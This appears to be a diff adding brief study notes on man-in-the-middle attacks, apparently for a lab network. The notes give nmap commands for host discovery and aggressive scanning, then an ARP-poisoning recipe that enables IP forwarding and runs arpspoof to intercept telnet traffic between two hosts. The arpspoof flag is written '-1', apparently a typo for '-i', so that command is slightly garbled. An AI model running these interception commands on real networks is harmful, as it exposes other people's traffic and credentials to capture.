@@ -1,0 +1,12 @@
+First example of Man in the Middle will be on our own LAN. If you take your ip for example 192.168.0.1/24 and want to see what else is on the network you will want to nmap 192.168.0.0/24 -sn
+From here you can enumerate them <ip> -A (scans aggressive)
+Then you can wireshark it and inspect packets
+
+--------------------ARP Poisoning--------------------------
+Do the same above to see what else is on the network
+From here you can actually spoof the IP of another machine and intercept traffic
+If 10.100.13.36 has telnet running then
+echo 1 > /proc/sys/net/ipv4/ip_forward
+arpspoof -1 eth1 -t 10.100.13.37 -r 10.100.13.36
+
+
